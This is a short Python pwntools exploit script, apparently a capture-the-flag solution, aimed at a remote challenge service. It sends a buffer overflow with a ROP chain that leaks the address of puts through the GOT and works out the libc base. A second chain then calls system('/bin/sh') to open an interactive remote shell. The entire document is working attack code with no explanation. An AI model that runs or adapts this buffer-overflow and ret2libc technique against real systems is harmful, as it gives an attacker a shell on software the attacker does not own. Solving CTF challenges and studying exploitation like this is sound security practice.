from pwn import *
context.arch='amd64'
context.log_level='debug'
def cmd(c):
	p.sendlineafter("> ",c)
#p=process('./pwn')
p=remote("challenge.ctf.games",31125)
main=0x4012a9
puts=0x4010e0
rdi=0x0000000000401493
got=0x000000000403f98
payload=[rdi,got,puts,main]

rop=flat(payload)
cmd(b"A"*0x220+p64(0xdeadbeef)+rop)
p.readline()
libc=ELF("./libc-2.31.so")
base=u64(p.readline()[:-1]+b'\0\0')-libc.sym['puts']
libc.address=base
#gdb.attach(p,'b *0x401428')
log.warning(hex(base))
payload=[0x401428,rdi,libc.search(b"/bin/sh").__next__(),libc.sym['system']]
rop=flat(payload)
cmd(b"A"*0x220+p64(0xdeadbeef)+rop)

p.interactive()
